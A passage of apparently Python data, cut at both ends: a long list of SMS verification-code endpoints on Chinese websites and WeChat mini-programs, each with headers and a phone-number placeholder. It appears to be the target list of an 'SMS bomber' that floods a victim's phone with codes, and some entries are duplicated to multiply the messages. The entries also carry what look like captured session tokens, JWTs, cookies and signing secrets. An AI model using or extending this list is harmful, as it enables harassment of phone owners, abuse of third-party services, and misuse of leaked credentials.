"url": "https://applets.trumpet.netease.com/api/applets/getVerificationCode",
"method": "GET",
"params": {
"phone": f"{phone}",
"validate": "CN31_iiwVNfg-Bb_dYFVBY11g.z-fLszvypROwWLcLkYNKDKXzbDRHf2DuRFLyuIBnQ9k_ibB59-vuBasddfhc8k2bKLwK-kyk78IwwtsLc-tm1dKdY1F1lgR2i7qlMOggBJqXyFIJOJz4UBKI_Cm_gRqQqtD50NSCPrQ09lzTa5zGb-yMsoRK4dW5IvRq_0znGjn6rHLX4w7xl4Z2HXpcOLwKikeBCE__2e8STtTDPOYT.O2W5bH8Z4pR56LeLhVns",
"trumpetLogin": "1"
},
"headers": {
"content-type": "application/json",
"authorization": "",
"client-info": "os_name=android;origin=wxMiniProgram;app_channel=netease;app_ver=4.26.0;udid=MODULE_NOT_EXIST;unisdk_deviceid=MODULE_NOT_EXIST;",
"deviceid": "3ce43a6c42da3af449952e473ef1f4b0",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx6ad76407d5533c7d/138/page-frame.html"
}
},
{
"name": "api.xhdesign.top",
"url": "https://api.xhdesign.top/b2c/app-api/member/auth/send-sms-code",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"scene": 1
},
"headers": {
"Content-Type": "application/json",
"Authorization": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf35347622b6b9145/2/page-frame.html"
}
},
{
"name": "aipig.51webjs.com",
"url": "https://aipig.51webjs.com/addons/unishop/Sms/sendCode",
"method": "POST",
"data": {
"mobile": f"{phone}"
},
"headers": {
"platform": "MP-WEIXIN",
"accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
"envversion": "release",
"token": "b9b60ab4-6b0f-442d-b6ce-fd62cd7e3380",
"wx-platform": "MAX",
"charset": "utf-8",
"referer": "https://servicewechat.com/wxa300e3c1f0adc655/65/page-frame.html"
}
},
{
"name": "yuni.baby",
"url": "https://yuni.baby/yuni-backend/api/user/permit/sms-code",
"method": "POST",
"data": {
"userTel": f"{phone}",
"sendType": "2"
},
"headers": {
"token": "",
"tel": "",
"platform": "mp",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx41301e4c67c7ff37/270/page-frame.html"
}
},
{
"name": "yuni.baby",
"url": "https://yuni.baby/yuni-backend/api/user/permit/hasPassword",
"method": "GET",
"params": {
"userTel": f"{phone}"
},
"headers": {
"token": "",
"tel": "",
"platform": "mp",
"content-type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx41301e4c67c7ff37/270/page-frame.html"
}
},
{
"name": "yuni.baby",
"url": "https://yuni.baby/yuni-backend/api/user/permit/sms-code",
"method": "POST",
"data": {
"userTel": f"{phone}",
"sendType": "3"
},
"headers": {
"token": "",
"tel": "",
"platform": "mp",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx41301e4c67c7ff37/270/page-frame.html"
}
},
{
"name": "www.drawa.net",
"url": "https://www.drawa.net/gateway",
"method": "POST",
"json_data": {
"SessionId": "",
"Version": 2,
"Command": {
"HZSMS": {
"platform": "wx_mini",
"Num": f"{phone}"
}
}
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wxda53d61df1c71a0b/113/page-frame.html"
}
},
{
"name": "yuehuahezi.com",
"url": "https://yuehuahezi.com/users/auth/send_code/api/",
"method": "POST",
"json_data": {
"phone_number": f"{phone}"
},
"headers": {
"User-Agent": "okhttp/4.9.2",
"Connection": "Keep-Alive",
"Accept": "application/json, text/plain, /",
"Accept-Encoding": "gzip",
"Content-Type": "application/json"
}
},
{
"name": "h5.yizudao.net",
"url": "https://h5.yizudao.net/handler/commhandler.ashx",
"method": "POST",
"params": {
"timestamp": "1767547634551"
},
"data": {
"act": "code",
"phone": f"{phone}",
"type": "3"
},
"headers": {
"Accept": "application/json, text/javascript, /; q=0.01",
"Accept-Encoding": "gzip, deflate, br, zstd",
"sec-ch-ua-platform": '"Android"',
"X-Requested-With": "XMLHttpRequest",
"sec-ch-ua": '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
"sec-ch-ua-mobile": "?1",
"Origin": "https://h5.yizudao.net",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://h5.yizudao.net/ip13/upload.html?ids=31_76_143_142_38&ref=null",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
"Cookie": "ASP.NET_SessionId=qzxu5nk1e00qt0nihsbnoxld"
}
},
{
"name": "partner.dahuatech.com",
"url": "https://partner.dahuatech.com/user/api/verify/sendCode",
"method": "POST",
"json_data": {
"sendCode": f"{phone}",
"system": "CLOUD",
"type": "ACT"
},
"headers": {
"Host": "partner.dahuatech.com",
"Connection": "keep-alive",
"content-type": "application/json;charset=UTF-8",
"accept": "application/json, text/plain, /",
"version": "1.0",
"accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3b3JrTm8iOiJCQVNFOnA1MTEyNDA5NTA1NTExMSIsInN5c3RlbSI6IlBBUlRORVIiLCJleHAiOjE3NzAyMjgzMjgsImlhdCI6MTc2NzU0OTg2OH0.Z0sIDcMn4Gf0I8qkN7Nr5zC_h-xZb2Z8SKA9bkpUApU",
"cloudToken": "",
"channel": "APPLET",
"phoneModel": "[object Null]",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxbe859d74da555326/181/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "api.shushangyigou.com",
"url": "https://api.shushangyigou.com/get-valid-code",
"method": "POST",
"json_data": {
"accountNo": f"{phone}",
"templateCode": "MOBILE_PASSWORD_REGISTER",
"nation": "86"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx446c354edb5da896/10/page-frame.html"
}
},
{
"name": "swmzb.fjswkj.cn",
"url": "https://swmzb.fjswkj.cn/client/cybercafe/bind/code",
"method": "POST",
"json_data": {
"mobile": f"{phone}"
},
"headers": {
"Content-Type": "application/json",
"client-cybercafe-token": "535C73DCEA89774CA3E523E3FFF4AB23",
"mall-front-token": "535C73DCEA89774CA3E523E3FFF4AB23",
"client-cybercafe-uniacid": "1",
"versiondev": "20250304",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxa2069a45c1328227/31/page-frame.html"
}
},
{
"name": "api.luyong.com",
"url": "https://api.luyong.com/api/code/sms",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Accept": "application/json",
"content-type": "application/json;charset=utf-8",
"Authorization": "Bearer",
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJub3ciOjE3Njc1Njg2MjU4MzgsImV4cCI6MTc2NzU3MDQyNSwidXNlcklkIjoxMDg3NDYsIm9yZ0lkIjowfQ.w5W8eiZ8YNOlGuSJBLezCYYK-qVPzPvIE-jFLC00GyI",
"client": "2",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf9f0941e1baa0a37/47/page-frame.html"
}
},
{
"name": "wss.i3210.com",
"url": "https://wss.i3210.com/auth/tryBind",
"method": "POST",
"data": {
"phoneNum": f"{phone}",
"type": "2",
"mpAccount": ""
},
"headers": {
"Accept": "application/json, text/javascript, /; q=0.01",
"Accept-Encoding": "gzip, deflate, br, zstd",
"sec-ch-ua-platform": '"Android"',
"X-Requested-With": "XMLHttpRequest",
"sec-ch-ua": "\"Chromium\";v=\"142\", \"Android WebView\";v=\"142\", \"Not_A Brand\";v=\"99\"",
"sec-ch-ua-mobile": "?1",
"Origin": "https://wss.i3210.com",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://wss.i3210.com/faceid_userInfo.html?unionId=o9K950m-x20ctXqGWOwgjkJ-Zzj8&weixinId3=og8G75MdW0dVNjHOdqEMpTgt4f84",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
}
},
{
"name": "api.g.birdwork.com",
"url": "https://api.g.birdwork.com/worker/v1/users/login/getVerifyCode/{phone}",
"method": "GET",
"headers": {
"content-type": "application/json",
"appType": "1",
"openId": "oA3Tp5ULuNco9eWr7wTJch7m6IiQ",
"tenantId": "1",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx3cb266bbdd65c963/206/page-frame.html"
}
},
{
"name": "s.manylinksmed.com",
"url": "https://s.manylinksmed.com/api-school/getLoginCodeByPhone",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"timestamp": "1767569171",
"appkey": "1420553000782135298",
"sign": "F2A0C7ED36DD1835A2A93EA87AC61DF6",
"platform": "VisualChart",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf41c603dc718a29d/63/page-frame.html"
}
},
{
"name": "api.g.birdwork.com_2",
"url": "https://api.g.birdwork.com/worker/v1/users/login/getVerifyCode/{phone}",
"method": "GET",
"headers": {
"content-type": "application/json",
"appType": "1",
"openId": "oA3Tp5ULuNco9eWr7wTJch7m6IiQ",
"tenantId": "1",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx3cb266bbdd65c963/206/page-frame.html"
}
},
{
"name": "xa.ydehr.com",
"url": "https://xa.ydehr.com/api/flexible/sendSms",
"method": "POST",
"json_data": {
"phone_number": f"{phone}",
"channels_id": "1"
},
"headers": {
"Content-Type": "application/json",
"token": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx2d08f7e8d1a8b07a/26/page-frame.html"
}
},
{
"name": "m.stock.pingan.com",
"url": "https://m.stock.pingan.com/ofs/http/ofs/getOpenAccountMobileCode",
"method": "POST",
"params": {
"request_id": "mk0epauj9rbwmshv",
"_": "1767571951916"
},
"data": {
"mobileNo": f"{phone}",
"useName": "平安期货",
"channel": "xcx_wechat",
"WT.mc_id": "xcx_wechat",
"inner_entry": "xcx_wechat"
},
"headers": {
"Accept": "application/json",
"Accept-Encoding": "gzip, deflate, br, zstd",
"sec-ch-ua-platform": '"Android"',
"X-Requested-With": "XMLHttpRequest",
"sec-ch-ua": "\"Chromium\";v=\"142\", \"Android WebView\";v=\"142\", \"Not_A Brand\";v=\"99\"",
"sec-ch-ua-mobile": "?1",
"Origin": "https://m.stock.pingan.com",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://m.stock.pingan.com/omm/phonex/page/index.html?key=p220977&channel=xcx_wechat&inner_entry=xcx_wechat&WT.mc_id=xcx_wechat",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
"Cookie": "BIGipServersis-omm-m-nginx_30074_PrdPool=1794350807.31349.0000; BIGipServersis-stock-frontend-m-static_30075_PrdPool=1542692567.31605.0000; sdcSource=xcx_wechat; sdcPlatform=android; sdcAgent=weixin; PHONEX_OMM_INTF_ESB_TICKET=UB_193bbf05-5708-4cc7-8202-0438fa933fd9_05b2f8254bc3055dbaae3a3e246fefd1; ouid=p220977; ofs_cookie_id_name=Tc98b8bd5-5f6f-47b6-9599-8c7658f2b85e; BIGipServersis-ofs-m-prd-nginx_30074_PrdPool=217292503.31349.0000; sdcInnerEntry=xcx_wechat; inner_entry=xcx_wechat; WEBTRENDS_ID=fbe0e73f-6839-bbd4-6cf0-1ce73dfcb1e1; connect.sid=s%3ANc6EkvKQP7RJVSTgENnYXjDXhwdYD_te.O7MI2ZBvub%2B6Gm8UwIpCdYJiNME5lttCcS58yhTWThg; BIGipServersis-stock-frontend-m-restapi_30073_PrdPool=2431885015.31093.0000; BIGipServerdsp-hbd-logcollector_8120_PrdPool=938712791.47135.0000; SD_UID=12abc984a4fc4c7a9ccd80570730716c; SD_SID=e31de1d343734b4c9226b1933c80231b; WT-FPC=id=2bfa66f6c2dd43cd6b51767571943574:lv=1767571950702:ss=1767571943574:fs=1767571943574:pn=1:vn=1; SD_SET=1767573751722"
}
},
{
"name": "s.xiaoluyy.com",
"url": "https://s.xiaoluyy.com/patientApi/userCenter/editPatientPhoneSendSmsCode",
"method": "POST",
"params": {
"os": "android",
"osVersion": "13",
"appVersion": "8.0.66",
"deviceModel": "VIVO",
"specificModel": "V2238A",
"channel": "3",
"version": "3.10.34",
"bigdataActId": "",
"bigDataEnterType": "0",
"pver": "3.10.34"
},
"json_data": {
"phoneNumber": f"{phone}"
},
"headers": {
"Accept": "application/json, text/plain, /",
"Content-Type": "application/json",
"content-type": "application/json;charset=UTF-8",
"ticket": "b0070dede239738706e407f22a097ba3",
"system": "6",
"uniqueuid": "34ee170f8077be4f73dc7b82dddc5ec9",
"op-sign-list": "ticket,signTime",
"qex-sign-list": "",
"signSecret": "71071e0bef45e02d6263beb8e44eb572",
"signTime": "1767572849170",
"X-Requested-With": "XMLHttpRequest",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx1762cf6582d6d49b/494/page-frame.html",
"Cookie": "acw_tc=0bdd343e17675728257917512ed66382402a7042f43c8d31afdfa5bd98b359; path=/; Max-Age=1800; ticket=b0070dede239738706e407f22a097ba3"
}
},
{
"name": "xcx-weixin.jdhn.top",
"url": "https://xcx-weixin.jdhn.top/index.php/api/sms/send",
"method": "POST",
"data": {
"mobile": f"{phone}"
},
"headers": {
"TOKEN": "",
"PLATFORM": "wxandriod",
"version": "1.0.0",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx83006e24b6716524/44/page-frame.html"
}
},
{
"name": "wx-xq.chufangyun.com.cn_1",
"url": "https://wx-xq.chufangyun.com.cn/love76/sendcode",
"method": "POST",
"data": {
"mobile": f"{phone}",
"code": "0b1bme1w3JH6j63Imw0w3Jj2sr0bme17",
"siteid": "245",
"autoid": "354"
},
"headers": {
"version": "5.0.40",
"hashtoken": "sAmEbpQ8rxP4kdC51ANq80tMiGeE7uEF2WuA3Bt07YHa5U32wte/yw33oL2ZH/w8WMp99nck6120DY5skjPoGx0NBrWLLM+Zm/ucS62axRMdwNwKNVy5rwTqYaUO5yfLwqf7MstDktDZsPetnGOtERkxtTVHdR1HjBaauXde4bY=",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx33faf9040d9167be/48/page-frame.html",
"Cookie": "loginFans="
}
},
{
"name": "wx-xq.chufangyun.com.cn_2",
"url": "https://wx-xq.chufangyun.com.cn/love76/sendcode",
"method": "POST",
"data": {
"mobile": f"{phone}",
"code": "0e1jc6ll2163Xg4AU1ll2no1gU1jc6l8",
"siteid": "70",
"autoid": "361"
},
"headers": {
"version": "5.0.40",
"hashtoken": "fZ0rZ186k8k37Z8MdRHts0FwqcFOMB5we/nBxPYz+j1MaBGcf50zQ01qUjGzOKh+e81H0IHcE3VdTpKX2t+JpOogzzqbYLQO7PjScM1EDWcSxfJ8tfLA3EySgVdm/bqJpSNGWf8WFnHJdVJZaVLG0UGgaX9xnwQDQ0l4cKCkKGg=",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx1e0614f0792b70a4/39/page-frame.html",
"Cookie": "loginFans="
}
},
{
"name": "wx-xq.chufangyun.com.cn_3",
"url": "https://wx-xq.chufangyun.com.cn/love76/sendcode",
"method": "POST",
"data": {
"mobile": f"{phone}",
"code": "0f11aH0w3Wkzh63GeE2w3B2ALl01aH0d",
"siteid": "416",
"autoid": "746"
},
"headers": {
"version": "5.0.38",
"hashtoken": "lh4NzI8Y43S9VA6ftb1N89DozHkyAzZ16Kg1DLXzrjQyksJGAaY9TIZoubp51vtMUNCSfUIeN6SF14UWfIgBy/VO7sgpOC+gGEDgn8V7te9u2r1fprFdaKgBov3xfO7Cz72K1WnhIP7Nv8OI45rMa95xmrbB6WZMqzCg/eEBCBo=",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx6c82fca86fec9cae/30/page-frame.html",
"Cookie": "loginFans="
}
},
{
"name": "admin.hnjuanzi.com",
"url": "https://admin.hnjuanzi.com/app-api/member/auth/send-sms-code",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"scene": 1
},
"headers": {
"Content-Type": "application/json",
"content-type": "application/json;charset=UTF-8",
"platform": "WechatMiniProgram",
"terminal": "10",
"tenant-id": "162",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx7f5fd23684e94da1/22/page-frame.html"
}
},
{
"name": "api.shangjianbao.cn",
"url": "https://api.shangjianbao.cn/app/set/account/code/1",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"X-Cc-Ver": "L4ZBWHDbKVGVym3Zm3W8BW+qEZmja7eIpUXWJdXdCoKGiha/uzKBT2zeWfYA0gt9onWVEFa41jq1XtOOnXl+jZVWsZbEU/n4ltouNPSLDWvMTuEHyFLzlsxa0VMu5zmbu3N1BYbTv9AlpbriIqccyHBcNc698102SSFI16XefkQ=",
"token": "0b259ebb-f700-49e8-9789-d812dd439e96",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxcf1ef902d9bec3ea/180/page-frame.html"
}
},
{
"name": "api.sqzs.com",
"url": "https://api.sqzs.com/connect/phone",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"x-channel": "szxcx-wxbe45bf21823f7dec/1.2.170",
"content-type": "application/json;charset=UTF-8",
"x-referrer": "/my/settings/binding?type=phone",
"charset": "utf-8",
"referer": "https://servicewechat.com/wxbe45bf21823f7dec/361/page-frame.html",
"Cookie": "SERVERID=c7b82d8ea5c4d9f4771deae73714055f|1767634533|1767634501; SERVERCORSID=c7b82d8ea5c4d9f4771deae73714055f|1767634533|1767634501"
}
},
{
"name": "www.xingjushidai.com",
"url": "https://www.xingjushidai.com/api/send/sendCode",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"timestamp": "1767635514967",
"token": "",
"content-type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx1916de546e98d533/27/page-frame.html"
}
},
{
"name": "xtlm-app.xingyao-mcn.cn",
"url": "https://xtlm-app.xingyao-mcn.cn/app/user/loginCode",
"method": "GET",
"params": {
"tel": f"{phone}"
},
"headers": {
"token": "",
"version": "99.99.63",
"devicesystem": "android",
"hostplatform": "mp-weixin",
"devicesbrand": "vivo",
"pkey": "3b999803-0169-27a2-972a-88b482784f89",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx9e4ac76387af73f6/114/page-frame.html"
}
},
{
"name": "minipush.shenhudong.com",
"url": "https://minipush.shenhudong.com/api/v1/sms/send",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"type": "login"
},
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx4951b208b3513429/102/page-frame.html"
}
},
{
"name": "yun-api.startupfun.cn",
"url": "https://yun-api.startupfun.cn/api/v1/user/mobile/get_verify_code",
"method": "POST",
"params": {
"appId": "wxbfd55a2196642168",
"ci": "e95cd2e0-ea60-11f0-8cb7-b718e17888fd",
"cp": "w",
"cv": "3.8.8",
"wpcp": "",
"wxSource": "wx"
},
"json_data": {
"deviceId": "o2HBJNZBAmbC3ao6M",
"mobile": f"{phone}",
"type": 1,
"uid": "",
"cp": "w",
"ci": "e95cd2e0-ea60-11f0-8cb7-b718e17888fd",
"cv": "3.8.8",
"appId": "wxbfd55a2196642168",
"wxSource": "wx",
"wpcp": ""
},
"headers": {
"Content-Type": "application/json",
"uid": "",
"X-Tuiwen-Token": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxbfd55a2196642168/186/page-frame.html"
}
},
{
"name": "yzb.buyqn.com",
"url": "https://yzb.buyqn.com/prod-api/common/sendMobileCode",
"method": "POST",
"json_data": {
"phonenumber": "+86-{phone}",
"type": "register"
},
"headers": {
"Host": "yzb.buyqn.com",
"Connection": "keep-alive",
"uniPlatform": "android",
"osName": "android",
"Accept-Language": "zh",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf367ee9f6985f024/124/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "htms-app.56yzm.com",
"url": "https://htms-app.56yzm.com/minifreight/user/new/getVerifycode",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"mesType": "02",
"appType": "12",
"sign": "d118970c37d80178aaeb6ccc9add4e1e"
},
"headers": {
"Content-Type": "application/json",
"appId": "wxb0a6deb61930a1dd",
"zoken": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxb0a6deb61930a1dd/28/page-frame.html"
}
},
{
"name": "api.sthjnet.com",
"url": "https://api.sthjnet.com/sso/user/sendSms",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"type": 2,
"appId": 3021
},
"headers": {
"Content-Type": "application/json",
"traceId": "cmpfpahyepmdad3peybeq3ywx864ettt",
"version": "3.0.46",
"client": "driver.wechatmini",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx5916b0726f05411e/66/page-frame.html"
}
},
{
"name": "ebh.dzbh.net",
"url": "https://ebh.dzbh.net/index.php/api/sms/send",
"method": "GET",
"params": {
"mobile": f"{phone}",
"event": "register",
"token": "null"
},
"headers": {
"content-type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wxf09cd0f624d290a3/1/page-frame.html"
}
},
{
"name": "wdt2.creditnb.com.cn",
"url": "https://wdt2.creditnb.com.cn:30443/api/third-party/sms",
"method": "GET",
"params": {
"phone": f"{phone}",
"scene": "change"
},
"headers": {
"Host": "wdt2.creditnb.com.cn:30443",
"Blade-Auth": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiLlvq7kv6HlsI_nqIvluo_nlKjmiLciLCJyZWFsX25hbWUiOiIxMzUyNDUwMTc0OCIsImF2YXRhciI6IiIsImNsaWVudF9pZCI6InNhYmVyIiwicm9sZV9uYW1lIjoiIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjE1NTI4NTg0Nzk5NjgzMDUxNTQiLCJ1c2VyX2lkIjoiMTk0MjY1ODg0OTA0NjA4MTUzNyIsInJvbGVfaWQiOiIxNTQ3ODcxNTgyMTQyNTg2ODgxIiwic2NvcGUiOlsiYWxsIl0sIm5hbWVfbmFtZSI6IuW-ruS_oeWwj-eoi-W6j-eUqOaItyIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InVzZXJJbmZvIjp7ImFjY291bnRJZCI6IjE5NDI2NTg4NDkxODAyOTkyNjUiLCJyZWFsTmFtZUlkIjoiIiwidXNlcklkIjoiMTk0MjY1ODg0OTA0NjA4MTUzNyIsInBob25lIjoiMTM1MjQ1MDE3NDgiLCJpZGNhcmQiOiIiLCJhdmF0YXJVcmwiOiIiLCJuYW1lIjoiIiwibmlja05hbWUiOiIiLCJpc1JlYWwiOiIiLCJiaXJ0aGRheSI6IiIsInBvc3RUc3RhcnQiOiIiLCJpZGNhcmRWYWxpZGVuIjoidHJ1ZSIsImRvbWFpbiI6IiIsIm1hbmFnZXJVc2VyTmFtZSI6IiIsIm1hbmFnZXJGdWxsbmFtZSI6IiIsIm1hbmFnZXJNb2JpbGUiOiIiLCJ3eFJvbGVMaWQiOiIiLCJ3eFJvbGVOYW1lIjoiIiwiZGVwdExldmVsIjotMX19LCJleHAiOjE3Njc3MjU5NTUsImRlcHRfaWQiOiIxNTUyODU5MTU0MDY0MjYxMTIxIiwianRpIjoiWnZVSElLQ3cyUEZ0bVhvSUhUejk1cWxiRHBjIiwiYWNjb3VudCI6IuW-ruS_oeWwj-eoi-W6j-eUqOaItyJ9.fgHgCTXjPW9WB31GMR6Bp0mBtgZeGISbzfPSg1arNps",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxdbd8883e4696d0f5/15/page-frame.html"
}
},
{
"name": "www.jnrzdbjt.com",
"url": "https://www.jnrzdbjt.com/jdztcapp/api/register/short/message",
"method": "POST",
"data": {
"phone": f"{phone}"
},
"headers": {
"jnpf-origin": "app",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx281db07179db1567/99/page-frame.html"
}
},
{
"name": "weixin.yirongcn.cc",
"url": "https://weixin.yirongcn.cc/prod-api/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"name": "发送验证码"
},
"headers": {
"Content-Type": "application/json",
"content-type": "application/json;charset=utf-8",
"Authorization": "cd5b223c-3f95-4c23-9959-d92382c40325",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx2cea3c7af0bac04a/15/page-frame.html"
}
},
{
"name": "sms.madudu.com.cn",
"url": "https://sms.madudu.com.cn/api/v1/send_sms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"channel_id": 54
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx3aee08af557777b8/20/page-frame.html"
}
},
{
"name": "job.0635easy.com_1",
"url": "https://job.0635easy.com/api/Login/registerSendMsg",
"method": "POST",
"data": {
"mobile": f"{phone}",
"sessionId": "",
"appletType": "wx"
},
"headers": {
"charset": "utf-8",
"referer": "https://servicewechat.com/wxd8a6a3b9692141d4/208/page-frame.html",
"Cookie": "PHPSESSID=f654e47106204aa2f9110763edd81ec3"
}
},
{
"name": "api.xiaolianhb.com",
"url": "https://api.xiaolianhb.com/m/mp/verification/one",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"bindFlg": 1,
"brand": "vivo",
"model": "V2238A#3.13.1",
"system": 2,
"appSource": 2,
"systemVersion": "Android 13",
"miniSource": 2,
"miniNo": "BA",
"appVersion": "5.12.22"
},
"headers": {
"Content-Type": "application/json",
"accessToken": "",
"refreshToken": "",
"nonceStr": "ymxsj1s4je",
"timestamp": "1767655649124",
"appId": "B6I7187WXZXCH6FWSXTM",
"sign": "55f8b89fc54407ba2e0e2b45d1103999",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx022877fd9f8c8758/55/page-frame.html"
}
},
{
"name": "yzapi.yuzhongi.com",
"url": "https://yzapi.yuzhongi.com/api/u/{phone}/verification-code/1",
"method": "GET",
"headers": {
"x-access-token": "",
"content-type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx75239e4a6ac1edff/6/page-frame.html"
}
},
{
"name": "glm.glodon.com",
"url": "https://glm.glodon.com/glm/worker-app-aggregator/gjg/account/message/code",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"platform": 4,
"type": 2
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
